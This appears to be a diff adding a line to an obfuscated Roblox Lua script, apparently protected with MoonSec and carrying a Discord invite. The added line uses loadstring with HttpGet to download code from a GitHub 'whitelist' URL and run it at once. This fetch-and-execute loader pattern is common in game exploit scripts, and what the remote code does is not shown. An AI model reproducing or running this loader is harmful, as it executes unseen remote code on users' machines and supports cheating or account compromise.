@@ -1,3 +1,8 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NoDripLiam/veryeasywhitelist/main/Key%20wl", true))()
+
+
+
+
 _WEB2BomHXKhOHnkz, Protected_by_MoonSecV2, Discord = 'discord.gg/gQEH2uZxUk'
 
 
